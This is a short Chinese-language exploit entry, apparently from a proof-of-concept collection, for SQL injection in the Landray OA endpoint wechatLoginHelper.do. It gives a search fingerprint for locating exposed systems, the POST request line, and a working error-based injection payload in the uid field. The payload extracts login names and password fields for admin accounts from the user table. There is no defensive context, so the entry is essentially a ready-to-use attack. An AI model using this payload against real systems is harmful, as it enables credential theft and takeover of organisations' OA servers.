# 蓝凌OA-WechatLoginHelper.do存在SQL注入漏洞

蓝凌 ｜ SQL注入 ｜ —
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /third/wechat/wechatLoginHelper.do HTTP/1.1`

**Payload**
```
method=edit&openid=&nickname=&image=&uid=123'and updatexml(1,concat('~',(select concat('~',test.fdLoginName,'~',test.fdPassword,'~') from com.landray.kmss.sys.organization.model.SysOrgPerson test where test.fdLoginName like '%25admin12%25'),'~'),1)=1-- '
```